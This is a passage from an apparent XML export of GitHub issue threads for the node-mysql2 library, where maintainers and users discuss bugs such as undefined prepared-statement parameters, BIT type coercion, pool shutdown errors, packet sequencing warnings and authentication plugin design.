    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>sorry, the question is still too broad for me to help without being able to attach debugger. To help I need you reduce your code to a minimum possible case and answer following questions:&#13;
&#13;
1) database server used (version)&#13;
2) mysql client library used&#13;
3) enable logging in mysql client ( add `{ debug: true}` to connection options and paste log output - see https://github.com/mysqljs/mysql#debugging-and-reporting-problems )&#13;
4) most important: explain what you see and how it's different from what you expect to see</Body>
    </Comment>
    <Comment>
      <Owner>abidrana7</Owner>
      <Body>@sidorares thanks again for you input!&#13;
Followings are my replies to your points:&#13;
&#13;
1) version of mysql database server used is: 5.6&#13;
2) sqlYog is used as mysql client (but it doesn't have any role in our scripts in whatever way, I think so)&#13;
3) there's not an issue like that as you are expecting from debugging option i.e. { debug: true} as I have tried it already&#13;
4) what I see is: suppose there are FOUR Jasmine tests each of them have to execute CALL button (at different place) at UI level using Protractor and then to fetch latest row inserted in DB upon clicking CALL by using mysql.&#13;
Problem here is: For the first 2 Jasmine tests fetched records will be exactly according to CALL button that marked STATS successfully inserted in DB. when it comes to third or fourth Jasmine test and executed the above mentioned code related to DB interaction , it retain the records that were fetched from SECOND test.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>2 - by 'client' I meant your runtime client, like mysql2 or mysqljs/mysql&#13;
&#13;
4 - can you trace down to what is related to mysql and particularily, this library (still not sure if it's used at all? you mentioned couple of times you are using mysqljs/mysql). In the second series of tests - can you see all your queries being executed but result is not what you expect? Can you try to log all queries?</Body>
    </Comment>
    <Comment>
      <Owner>abidrana7</Owner>
      <Body>I have tried the followings as my sql run time client libraries:&#13;
1) var mysql = require('mysql2/promise');&#13;
2) var mysql = require('promise-mysql');&#13;
3) Promise = require('bluebird');&#13;
    var mysql = Promise.promisifyAll(require('mysql')); &#13;
&#13;
As I have tried all these but the issue is same. I have tried these as an alternate to each other but unable to find any solution yet.&#13;
yes it is confirmed that all of queries (query is same for all tests) have been executed successfully but results at test no: third or fourth is not according to my expectations. </Body>
    </Comment>
    <Comment>
      <Owner>abidrana7</Owner>
      <Body>Sorry, mistakenly closed this issue!</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>It feels that there is an issue somewhere in your code (mysql2 and mysqljs/mysql are quite different and you are getting same results). Double check timeouts and order of executing queries and receiving the data - due to async nature of both mysql clients and Protractor this is often quite error prone and requires attention </Body>
    </Comment>
  </Issue_504>
  <Issue_505>
    <Repository>node-mysql2</Repository>
    <Title>allow to use arbitrary plugin as first auth method</Title>
    <Owner>sidorares</Owner>
    <Body>currently only allowed connect method initially is `mysql_native_password`. Some servers can potentially prefer to start with custom auth immediately, instead of rejecting  `mysql_native_password` and doing AUTH_SWITH_HANDLER sequence afterwards. Also some servers can be configured to allow 'plugin based auth' but not 'auth switch request' - those are two different capabilities flags&#13;
&#13;
1) respect handshake packet plugin name&#13;
2) deprecate `authSwitchHandler` and rename it to be `authPluginHandler`&#13;
3) provide default handler for `mysql_native_password`&#13;
&#13;
also need to think of something to make it easy to chain handlers: &#13;
```&#13;
const mysqlIamAuth = require('mysql-iam-auth'); // imaginary, does not exist&#13;
const mysqMyCustomAuth = require('@internal/customauth');&#13;
&#13;
const pool = mysql2.createPool({&#13;
  authPluginHandler: combineAuthHandlers(mysqlIamAuth, mysqMyCustomAuth)&#13;
})&#13;
```&#13;
&#13;
ref http://stackoverflow.com/questions/43448563/connecting-to-mariadb-with-nodejs-over-ssl-with-clear-text-password/43450396#43450396</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thinking about merging plugin auth and auth switch. Maybe api like this: &#13;
&#13;
```js&#13;
const mysql2 = require('mysql');&#13;
const pool = mysql2.createPool({&#13;
  authPlugins: {&#13;
     sha256_password: (data, cb) =&gt; { /* ... probably going to be included by default. You should be able to disable it by specifying  authPlugins: { sha256_password: null } */ },&#13;
     mysql_clear_password: mysql2.authPlugins.mysql_clear_password(validateFunction), // not enabled by default but included with driver and documented&#13;
  }, &#13;
&#13;
  // better name for this option? "defaultPlugin" ? "initialConnectionPlugin" ?&#13;
  // this is plugin name sent with initial connection (also handler executed at connection time and result of the handler included with initial connection"&#13;
  //  error if name does not match authPlugins keys ( or built-in plugins ). Default to "mysql_native_password" if not specified&#13;
  connectAuthPluginName: 'mysql_native_password'  // not used if server does not support PLUGIN_AUTH&#13;
                                                                               // should it error if specified and no server support for PLUGIN_AUTH ? &#13;
  // some way to handle dynamic plugin names? currently possible with authSwitchHandler but I want to deprecate it&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>normano</Owner>
      <Body>defaultAuthPlugin sounds like a good name to me. An auth plugin should likely be able to write it's own kinds of packets though or at least find some way for the plugin/function to return the next handler for the command. Considering how the caching_sha2 one appears to want a response to the fullauthentication request and there is also the fast auth path (https://dev.mysql.com/doc/dev/mysql-server/8.0.4/page_caching_sha2_authentication_exchanges.html), you'd want the plugin to handle all success responses until it says it is done (return null).</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; it's own kinds of packets though&#13;
&#13;
I think it's ok to assume plugin is only able to send data or null, afaik it's never allowed to send any other packet than `AuthMoreData` or OK, but there can be possible multiple exchanges and just having function as plugin is not enough, we need instanse of object that updates it state as it progresses from AuthMoreData to final OK</Body>
    </Comment>
    <Comment>
      <Owner>normano</Owner>
      <Body>I think function that returns the next handler is fine. You as the middle man don't care for state, only what comes next. If I write a plugin then I'll worry about state on my side and know only to return to you what should be called next. &#13;
&#13;
Object is fine too but then you have to figure out how to structure the methods it should call right? Not too big a fan, but done right it will work.</Body>
    </Comment>
  </Issue_505>
  <Issue_506>
    <Repository>node-mysql2</Repository>
    <Title>"null" as a value can't be used for certain statements</Title>
    <Owner>sidorares</Owner>
    <Body>Seems that, somewhere down the line, "toString" is called on all of the arguments of prepared statements, which can't be run on the value of null since it's.. well, null.&#13;
&#13;
```&#13;
TypeError: Cannot read property 'toString' of undefined&#13;
    at Execute.toPacket (/home/planetmi/chat/node/js/node_modules/mysql2/lib/packets/execute.js:47:39)&#13;
    at Execute.start (/home/planetmi/chat/node/js/node_modules/mysql2/lib/commands/execute.js:50:40)&#13;
    at Execute.Command.execute (/home/planetmi/chat/node/js/node_modules/mysql2/lib/commands/command.js:39:20)&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>this was started in #480 but unfortunately did not have time yet to review &amp; merge&#13;
&#13;
also related are #493, #353</Body>
    </Comment>
  </Issue_506>
  <Issue_507>
    <Repository>node-mysql2</Repository>
    <Title>Prepared statement integer arguments converted to string causes issues with BIT(n)</Title>
    <Owner>sidorares</Owner>
    <Body>So I'm having an odd issue related to the BIT data type, and its behavior is acting quite strange compared to the npm mysql driver, which I used prior to mysql2.&#13;
&#13;
In that version, their prepared statements allowed me to interact with the BIT data type as if it was a number with no issue - it returned me an integer from the data base, and inserting/using bitwise operations worked just fine.&#13;
&#13;
For some reason, when I perform the same queries with mysql2, the numbers in the prepared statements are being converted to zero (as expected)... but the values actually inserted into the database are 1 and 0110000, (for BIT(1) and BIT(7)) respectively, even though the MySQL event log + query log on my end show that it should be zero.&#13;
&#13;
These are the two arguments passed to pool.execute, which I log in my own file:&#13;
&#13;
```{"query":"INSERT INTO `chat_messages` (sender, recipient, text, time, type, flags) VALUES (?, ?, ?, ?, ?, ?)","arguments":[139580,1,"Hello from bot",1492249595,0,0]}```&#13;
&#13;
And this is what the MySQL General Log logged:&#13;
&#13;
```    413 Prepare INSERT INTO `chat_messages` (sender, recipient, text, time, type, flags) VALUES (?, ?, ?, ?, ?, ?)&#13;
    413 Execute INSERT INTO `chat_messages` (sender, recipient, text, time, type, flags) VALUES ('139580', '1', 'Hello from bot', '1492249595', '0', '0')```&#13;
&#13;
Looks all good, I expect zero and zero to be inserted - however...&#13;
&#13;
![](http://i.imgur.com/nPqFp1O.png)&#13;
&#13;
The issue appears to be in the way the prepared statements function. Instead of allowing numbers to be numbers, all arguments are forced to be strings, which confuses the MySQL parser since it is interpreting '0' as a bitset instead of the number zero. If I copy the same query and perform it without the quotes around the numbers, it works a treat.&#13;
&#13;
Is there any way to disable the quotes around non-string arguments?</Body>
    <State>open</State>
    <Comment>
      <Owner>Paril</Owner>
      <Body>I've discovered that I can temporarily work around this by doing this:&#13;
&#13;
```INSERT INTO `chat_messages` (sender, recipient, text, time, type, flags) VALUES (?, ?, ?, ?, CAST(? AS UNSIGNED), CAST(? AS UNSIGNED))```&#13;
&#13;
It's a bit ugly, but to be fair I did use this method below in another query:&#13;
&#13;
```SELECT `id`, `sender`, `recipient`, CAST(`type` AS UNSIGNED) AS `type`, CAST(`flags` AS UNSIGNED) AS `flags` FROM `chat_messages` WHERE id = ?```&#13;
&#13;
I'm just wondering if there's anything that can be done about prepared statements converting the arguments to string; it seems unnecessary, prepared statements can support integral arguments can't they? I use a similar thing on PHP via PDO, and it seems to work fine with bitsets/integral values.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>yes, I would like `.execute()` to serialise numbers as numbers when possible&#13;
&#13;
related discussions: #353 and #446</Body>
    </Comment>
  </Issue_507>
  <Issue_508>
    <Repository>node-mysql2</Repository>
    <Title>Connection pooling promise "end" function throws exception if a connection is waiting to query</Title>
    <Owner>sidorares</Owner>
    <Body>I'm using mysql2/promise; if I attempt to .end() a Pool just after a call to pool.execute (such as during an ungraceful exit or if I'm rebooting a server and a query happens to run during that time), an exception is thrown. My assumption was that it was meant to wait until all of the queries are done before returning execution.&#13;
&#13;
```{ Error: Can't add new command when connection is in closed state&#13;
    at PoolConnection.Connection._addCommandClosedState (G:\xampp2\htdocs2\chat3p0\server_node\js\node_modules\mysql2\lib\connection.js:145:13)&#13;
    at PoolConnection.execute (G:\xampp2\htdocs2\chat3p0\server_node\js\node_modules\mysql2\lib\connection.js:614:8)&#13;
    at G:\xampp2\htdocs2\chat3p0\server_node\js\node_modules\mysql2\lib\pool.js:159:17&#13;
    at G:\xampp2\htdocs2\chat3p0\server_node\js\node_modules\mysql2\lib\pool.js:36:14&#13;
    at _combinedTickCallback (internal/process/next_tick.js:73:7)&#13;
    at process._tickCallback (internal/process/next_tick.js:104:9) fatal: true }</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you show the code around `.execute()`? The error indicates that some command was added after `end()` was called. `.end()` adds COM_QUIT command to the queue and sets the flag 'connection is about to be closed, adding more commands not allowed'. Commands that are before `end` in the queue are still going to be processed</Body>
    </Comment>
    <Comment>
      <Owner>Paril</Owner>
      <Body>Nothing in the stack is part of my code, so it's hard to tell. Since a lot of this asynchronous stuff is done through promises I don't have a very clear idea of where things are going/coming from, but I have a slight hint here.&#13;
&#13;
This specific issue happens if I gracefully try to close the server; on graceful exit, all users are disconnected gracefully and each disconnect is triggering a query that updates a field in the database, but of course it's likely not executed on that tick so it's in the queue. After that's all happened, the pool is then end()ed, but the promises for the query must then be getting called back to and trying to run Execute or something which is throwing the error - that's the only explanation I can come up with at the moment at least.&#13;
&#13;
I can probably fix this specific case by just waiting for all of the connections to fully drain before closing the pool, but because of the asynchronous nature of the rest of the code it's hard to guarantee that there wasn't a query that will be hit somewhere down a await somewhere.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'll try to land changes discussed in #530 soon, that might help locating source</Body>
    </Comment>
    <Comment>
      <Owner>Paril</Owner>
      <Body>Cool, thanks! I'll keep an eye on that one. In the mean time I suppose I'll gracefully boot the users, wait like 5 seconds for everything to drain and then end the pool.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>there is also `pool.end()` that (I believe) puts `.end()` command to all open connections and at the same time removes them from 'active' list so in theory `_addCommandClosedState` should not happen in that case</Body>
    </Comment>
    <Comment>
      <Owner>Paril</Owner>
      <Body>Yeah pool.end is what I'm calling to close the pool.</Body>
    </Comment>
  </Issue_508>
  <Issue_509>
    <Repository>node-mysql2</Repository>
    <Title>TypeError: conn.beginTransaction is not a function</Title>
    <Owner>sidorares</Owner>
    <Body>when we use connectionPool , and get the connection from Pool&#13;
we got the error on `    await conn.beginTransaction();`  as the title said:&#13;
"TypeError: conn.beginTransaction is not a function"&#13;
&#13;
I checked the source code and found `inherits(PoolConnection, Connection);`, in that case , the PoolConnection should has the same function , anyone can help this?</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>promise wrapper does not inherit from Connection or Pool connection ( it can't, api is different, async functions are not the same as CPS-style functions)&#13;
&#13;
the issue you having is likely fixed by #531, it's not pushed to npm yet, you can try current master</Body>
    </Comment>
  </Issue_509>
  <Issue_510>
    <Repository>node-mysql2</Repository>
    <Title>Warning: got packets out of order. Expected 1 but received 28</Title>
    <Owner>sidorares</Owner>
    <Body>I am trying to create a MySQL server using `node-mysql2`, but I am getting the following errors:&#13;
&#13;
```&#13;
Warning: got packets out of order. Expected 1 but received 28&#13;
Warning: got packets out of order. Expected 2 but received 29&#13;
Warning: got packets out of order. Expected 3 but received 30&#13;
Warning: got packets out of order. Expected 4 but received 31&#13;
Warning: got packets out of order. Expected 5 but received 32&#13;
[ [ TextRow { '1': 1 } ],&#13;
  [ { catalog: 'def',&#13;
      schema: '',&#13;
      name: '1',&#13;
      orgName: '',&#13;
      table: '',&#13;
      orgTable: '',&#13;
      characterSet: 63,&#13;
      columnLength: 1,&#13;
      columnType: 8,&#13;
      flags: 129,&#13;
      decimals: 0 } ] ]&#13;
&#13;
```&#13;
&#13;
This is the server initialization code, https://github.com/gajus/seeql/blob/fb615713a6fe3b856c543d2dd5e27286ba3e665a/src/index.js#L135-L142.&#13;
&#13;
```js&#13;
connection.serverHandshake({&#13;
  capabilityFlags: 0xffffff,&#13;
  characterSet: 8,&#13;
  connectionId: connectionId++,&#13;
  protocolVersion: 10,&#13;
  serverVersion: '5.6.10',&#13;
  statusFlags: 2&#13;
});&#13;
&#13;
```&#13;
&#13;
What am I missing?&#13;
&#13;
Using Node.js v7.7.1.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I think it's an issue with mysql2 server implementation. Need to add proper sequence id handling server side. It's a bit tricky, you increment it with each packet but reset at the start of command</Body>
    </Comment>
    <Comment>
      <Owner>trevorr</Owner>
      <Body>I'm having the same issue, with lots of these messages being displayed:&#13;
&#13;
```&#13;
Warning: got packets out of order. Expected 6 but received 2&#13;
Warning: got packets out of order. Expected 7 but received 3&#13;
Warning: got packets out of order. Expected 8 but received 4&#13;
Warning: got packets out of order. Expected 9 but received 5&#13;
Warning: got packets out of order. Expected 10 but received 6&#13;
Warning: got packets out of order. Expected 11 but received 3&#13;
Warning: got packets out of order. Expected 12 but received 4&#13;
Warning: got packets out of order. Expected 13 but received 5&#13;
Warning: got packets out of order. Expected 14 but received 6&#13;
Warning: got packets out of order. Expected 15 but received 7&#13;
Warning: got packets out of order. Expected 16 but received 4&#13;
Warning: got packets out of order. Expected 17 but received 5&#13;
Warning: got packets out of order. Expected 18 but received 6&#13;
Warning: got packets out of order. Expected 19 but received 7&#13;
Warning: got packets out of order. Expected 20 but received 8&#13;
Warning: got packets out of order. Expected 21 but received 5&#13;
Warning: got packets out of order. Expected 22 but received 6&#13;
Warning: got packets out of order. Expected 23 but received 7&#13;
Warning: got packets out of order. Expected 24 but received 8&#13;
Warning: got packets out of order. Expected 25 but received 9&#13;
Warning: got packets out of order. Expected 26 but received 6&#13;
Warning: got packets out of order. Expected 27 but received 7&#13;
Warning: got packets out of order. Expected 28 but received 8&#13;
Warning: got packets out of order. Expected 29 but received 9&#13;
Warning: got packets out of order. Expected 30 but received 10&#13;
Warning: got packets out of order. Expected 31 but received 7&#13;
Warning: got packets out of order. Expected 32 but received 8&#13;
Warning: got packets out of order. Expected 33 but received 9&#13;
Warning: got packets out of order. Expected 34 but received 10&#13;
```&#13;
&#13;
I got 591 of these from streaming back 601874 records.</Body>
    </Comment>
  </Issue_510>
  <Issue_511>
    <Repository>node-mysql2</Repository>
    <Title>Don't try to write undefined parameters.</Title>
    <Owner>sidorares</Owner>
    <Body>This is a re-submission of @ChiperSoft's fix, as [requested](https://github.com/sidorares/node-mysql2/pull/480#issuecomment-277293179) by @sushantdhiman: &#13;
&#13;
&gt; This addresses an exception that occurs when using namedParameters if the named param is missing from the values object. The code hits `this.parameters[i].toString()` and throws up because `this.parameters[i]` is undefined.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I understand what problem you trying to solve ( driver should not crash regardless of the input !!! ) but a bit concerned with your solution&#13;
&#13;
` !== null ` check was about building 'null bitmask' - in binary protocol, [all NULL parameters are compressed](https://dev.mysql.com/doc/internals/en/null-bitmap.html), this part was not about checking if params are "defined"&#13;
&#13;
with extra `!==undefined` check if you mistype field it's just silently ignored (hopefully you get back "incorrect number of parameters" sql error)&#13;
&#13;
Is there any reason we want to send execute packet in that case? Maybe document "undefined variables are not allowed" in js&lt;-&gt;mysql types documentation and make code error early if undefined parameter is passed? </Body>
    </Comment>
    <Comment>
      <Owner>vlasky</Owner>
      <Body>At the moment, we are using prepared statements invoked with connection.execute(). When the wrong number of arguments is passed to execute(), the exception message does not include the actual SQL statement or the line of code from where connection.execute() was called.&#13;
&#13;
This is making it virtually impossible to identify and debug the code that is causing the problem.&#13;
&#13;
This is an example of what we currently get without the fix:&#13;
&#13;
```&#13;
W20161118-19:49:32.812(11)? (STDERR) /home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/packets/execute.js:47&#13;
W20161118-19:49:32.814(11)? (STDERR)           var str = this.parameters[i].toString();&#13;
W20161118-19:49:32.815(11)? (STDERR)                                       ^&#13;
W20161118-19:49:32.815(11)? (STDERR)&#13;
W20161118-19:49:32.816(11)? (STDERR) TypeError: Cannot read property 'toString' of undefined&#13;
W20161118-19:49:32.817(11)? (STDERR)     at Execute.toPacket (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/packets/execute.js:47:39)&#13;
W20161118-19:49:32.819(11)? (STDERR)     at Execute.start (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/commands/execute.js:50:40)&#13;
W20161118-19:49:32.819(11)? (STDERR)     at Execute.Command.execute (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/commands/command.js:39:20)&#13;
W20161118-19:49:32.819(11)? (STDERR)     at PoolConnection.Connection.handlePacket (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/connection.js:417:28)&#13;
W20161118-19:49:32.820(11)? (STDERR)     at PoolConnection.Connection.handlePacket (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/connection.js:424:12)&#13;
W20161118-19:49:32.820(11)? (STDERR)     at PacketParser.onPacket (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/connection.js:93:16)&#13;
W20161118-19:49:32.821(11)? (STDERR)     at PacketParser.executeStart (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/packet_parser.js:73:14)&#13;
W20161118-19:49:32.821(11)? (STDERR)     at Socket.&lt;anonymous&gt; (/home/apache/.meteor/packages/vlasky_mysql/.1.2.4.15e9rxz++os+web.browser+web.cordova/npm/node_modules/mysql2/lib/connection.js:101:29)&#13;
W20161118-19:49:32.822(11)? (STDERR)     at emitOne (events.js:77:13)&#13;
W20161118-19:49:32.823(11)? (STDERR)     at Socket.emit (events.js:169:7)&#13;
```&#13;
&#13;
We (and others) urgently need a runtime mechanism that will allow us to identify the specific SQL statement (and lines of code) for which undefined parameters are being passed.&#13;
&#13;
As you correctly say, it would technically not be necessary to send the execute packet - it would be more efficient to have code to detect this beforehand and throw an exception.&#13;
&#13;
However, this is not a situation that would happen very often - passing undefined arguments would almost always be programmer error and therefore would be fixed very quickly once discovered.&#13;
&#13;
Therefore, I don't consider the efficiency difference to be a strong reason to not merge this pull request which implements an extremely simple, straightforward fix.&#13;
&#13;
I would prefer this pull request to be merged so that everyone in a situation like ours can immediately debug and fix their code and let the more efficient approach be implemented later.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; strong reason to not merge this pull request which implements an extremely simple, straightforward fix.&#13;
&#13;
I'm just suggesting even more simple fix. For example, add here https://github.com/vlasky/node-mysql2/blob/d347710630b49df709942dccd252f9630a11439f/lib/commands/execute.js#L49 something like this:&#13;
&#13;
```js&#13;
if (!this.parameters.every(p =&gt; typeof p !== 'undefined')) {&#13;
  const err = new Error(`Passed undefined parameter to prepared statement, query is ${this.sql}`)&#13;
  if (this.onResult) {&#13;
      this.onResult(err);&#13;
  } else {&#13;
    this.emit('error', err);&#13;
  }&#13;
  return;&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>vlasky</Owner>
      <Body>Yes that looks promising.&#13;
&#13;
Can we make it so that the error object includes both the query and the array of parameters that was passed as separate properties? This information would help narrow down the cause.&#13;
&#13;
This might require creating a custom ExecuteError object that derives from Error.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Can we make it so that the error object includes both the query and the array of parameters that was passed as separate properties?&#13;
&#13;
yes (probably using util.inspect? - so that large Buffer/arrays are trimmed automatically and not blow up logs)&#13;
&#13;
&gt; This might require creating a custom ExecuteError object that derives from Error.&#13;
I guess we could just put everything in error message ( standard `Error` constructor parameter )&#13;
&#13;
The code I posted wasn't tested at all. Would you want to explore that approach yourself and create another PR? Also, need to add unit test ( If you need my help - I might be able to allocate couple of hours to this later this week )&#13;
&#13;
Sorry for nitpicking, just think this is better than applying temp solution first and refactor it after</Body>
    </Comment>
    <Comment>
      <Owner>n8ores</Owner>
      <Body>What happened with this? We are still getting these errors which provide no context as to the query or parameters which caused the query to fail.&#13;
&#13;
The code provided by @sidorares looked promising, why was it not incorporated? Even better if parameters can be returned in the error also as suggested by @vlasky, but understand that may cause an issue with large objects. Just having the query would probably be sufficient for us to at least know where the problem is occuring and therefore be able to fix the offending code.&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@vlasky would you have time to go through my suggestions? If not that's ok, I might be able to find some time over weekend to do that myself</Body>
    </Comment>
    <Comment>
      <Owner>vlasky</Owner>
      <Body>@sidorares I see that the code has changed a bit since I last looked at it.&#13;
&#13;
To help us debug a recent issue, I changed the following line&#13;
&#13;
https://github.com/sidorares/node-mysql2/blob/master/lib/connection.js#L617&#13;
&#13;
from&#13;
&#13;
`throw new TypeError('Bind parameters must not contain undefined. To pass SQL NULL specify JS null');`&#13;
&#13;
to &#13;
&#13;
`throw new TypeError('Bind parameters must not contain undefined. To pass SQL NULL specify JS null. SQL: ' + options.sql);`</Body>
    </Comment>
    <Comment>
      <Owner>vlasky</Owner>
      <Body>Another question @sidorares - is it possible in the code to get a count of the number of question mark placeholders contained within a prepared statement?&#13;
&#13;
I want to put in a safety check to generate an exception if the number of question marks placeholders in the prepared statement does not equal the number of elements in the parameter value array passed to execute().</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; is it possible in the code to get a count of the number of question mark placeholders contained within a prepared statement?&#13;
&#13;
yes, result of `prepare` command has `parameterDefinitions` array - https://github.com/sidorares/node-mysql2/blob/0c422dd9d88a211015ddf4fcc8531048de9b1340/lib/commands/prepare.js#L119&#13;
&#13;
see how it's passed to execute here: https://github.com/sidorares/node-mysql2/blob/0c422dd9d88a211015ddf4fcc8531048de9b1340/lib/connection.js#L643&#13;
</Body>
    </Comment>
  </Issue_511>
  <Issue_512>
    <Repository>node-mysql2</Repository>
    <Title>Connection was killed could (should?) be a fatal error</Title>
    <Owner>sidorares</Owner>
    <Body>This a bit of an obscure one. Using mariadb, I'm able to get the following error if the database is stopped during a query:&#13;
&#13;
````&#13;
Error: Connection was killed&#13;
at Packet.asError (/node_modules/mysql2/lib/packets/packet.js:667:13)&#13;
at Execute.Command.execute (/node_modules/mysql2/lib/commands/command.js:29:22)&#13;
at PoolConnection.Connection.handlePacket (/node_modules/mysql2/lib/connection.js:417:28)&#13;
at PacketParser.onPacket (/node_modules/mysql2/lib/connection.js:93:16)&#13;
at PacketParser.executeStart (/node_modules/mysql2/lib/packet_parser.js:73:14)&#13;
at Socket.&lt;anonymous&gt; (/node_modules/mysql2/lib/connection.js:101:29)&#13;
at emitOne (events.js:96:13)&#13;
at Socket.emit (events.js:189:7)&#13;
at readableAddChunk (_stream_readable.js:176:18)&#13;
at Socket.Readable.push (_stream_readable.js:134:10)&#13;
````&#13;
&#13;
errno: 1927&#13;
sqlstate: 70100 (query interrupted)&#13;
fatal: false&#13;
&#13;
I'm wondering if the error should be fatal since the connection is killed.&#13;
&#13;
The error code is specific to mariadb:&#13;
https://mariadb.com/kb/en/mariadb/mariadb-error-codes/</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>if underlying tcp connection is killed it probably does not matter&#13;
&#13;
I think 'is fatal' is important for connection pool, when we know that connection cannot be reused despite stream is still open</Body>
    </Comment>
    <Comment>
      <Owner>magnusjt</Owner>
      <Body>It's also important when running a query because it can be used to decide to retry the query later.</Body>
    </Comment>
    <Comment>
      <Owner>magnusjt</Owner>
      <Body>Found a bit more info here:&#13;
https://github.com/PyMySQL/PyMySQL/issues/526&#13;
&#13;
I can also see the mentioned error in my logs:&#13;
Warning: got packets out of order. Expected 1 but received 0</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@magnusjt thanks! I'll try to reproduce with maria and have a look</Body>
    </Comment>
  </Issue_512>
  <Issue_513>
    <Repository>node-mysql2</Repository>
    <Title>Server requires auth switch, but no auth switch handler provided</Title>
    <Owner>sidorares</Owner>
    <Body>As per http://stackoverflow.com/questions/41941663/server-requires-auth-switch-but-no-auth-switch-handler-provided and https://github.com/mysqljs/mysql/issues/1396&#13;
&#13;
This error did not occur on our test mysql server, but it does occur on the production one.&#13;
&#13;
When adding the authSwitchHandler as suggested the only thing that gets printed is `{ pluginName: '', pluginData: &lt;Buffer &gt; }`&#13;
Doesn't seem very helpful.&#13;
`debug: true` added a whole load of stuff, some of which follows (redacted in case hex strings contains credentials:&#13;
&#13;
```&#13;
Add command: Connection&#13;
Add command: Connection&#13;
 raw: &lt;redacted&gt;&#13;
2 undefined ==&gt; Connection#handshakeInit(0,,60)&#13;
Server hello packet: capability flags:41516=(long flag, connect with db, compress, protocol 41, transactions, secure connection)&#13;
Sending handshake packet: flags:8582095=(long password, found rows, long flag, connect with db, odbc, local files, ignore space, protocol 41, ignore sigpipe, transactions, reserved, secure connection, multi results, session track)&#13;
2 59003828 &lt;== Connection#handshakeInit(1,,79)&#13;
2 59003828 &lt;== &lt;redacted&gt;&#13;
 raw: &lt;redacted&gt;&#13;
1 undefined ==&gt; Connection#handshakeInit(0,,60)&#13;
Server hello packet: capability flags:41516=(long flag, connect with db, compress, protocol 41, transactions, secure connection)&#13;
Sending handshake packet: flags:8582095=(long password, found rows, long flag, connect with db, odbc, local files, ignore space, protocol 41, ignore sigpipe, transactions, reserved, secure connection, multi results, session track)&#13;
1 59003827 &lt;== Connection#handshakeInit(1,,79)&#13;
1 59003827 &lt;== &lt;redacted&gt;&#13;
Add command: Connection&#13;
 raw: fe&#13;
2 59003828 ==&gt; Connection#handshakeResult(2,EOF,5)&#13;
Request ended&#13;
 raw: fe&#13;
1 59003827 ==&gt; Connection#handshakeResult(2,EOF,5)&#13;
 raw: &lt;redacted&gt;&#13;
3 undefined ==&gt; Connection#handshakeInit(0,,60)&#13;
Server hello packet: capability flags:41516=(long flag, connect with db, compress, protocol 41, transactions, secure connection)&#13;
Sending handshake packet: flags:8582095=(long password, found rows, long flag, connect with db, odbc, local files, ignore space, protocol 41, ignore sigpipe, transactions, reserved, secure connection, multi results, session track)&#13;
3 59003829 &lt;== Connection#handshakeInit(1,,79)&#13;
3 59003829 &lt;== &lt;redacted&gt;&#13;
 raw: fe&#13;
3 59003829 ==&gt; Connection#handshakeResult(2,EOF,5)&#13;
&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>What's the server version you are using?</Body>
    </Comment>
    <Comment>
      <Owner>DJ-DJL</Owner>
      <Body>```&#13;
protocol_version 10&#13;
version 5.0.95-log&#13;
version_bdb Sleepycat Software: Berkeley DB 4.1.24: (December 16, 2011)&#13;
version_comment Source distribution&#13;
version_compile_machine x86_64&#13;
version_compile_os redhat-linux-gnu&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>DJ-DJL</Owner>
      <Body>I have tried connecting via a different method and get this message instead:&#13;
`Authentication with old password no longer supported, use 4.1 style passwords.`&#13;
I'm not sure if this relates to the same underlying problem or not?&#13;
I am already exploring avenues to address this alternative error.</Body>
    </Comment>
    <Comment>
      <Owner>DJ-DJL</Owner>
      <Body>Turns out this was indeed the problem.&#13;
Solution here: https://forums.mysql.com/read.php?38,593423,593423&#13;
&#13;
Perhaps the error message could be improved?</Body>
    </Comment>
  </Issue_513>
  <Issue_514>
    <Repository>node-mysql2</Repository>
    <Title>Fix for `TypeError: Cannot read property 'toString' of undefined` when missing a named parameter</Title>
    <Owner>sidorares</Owner>
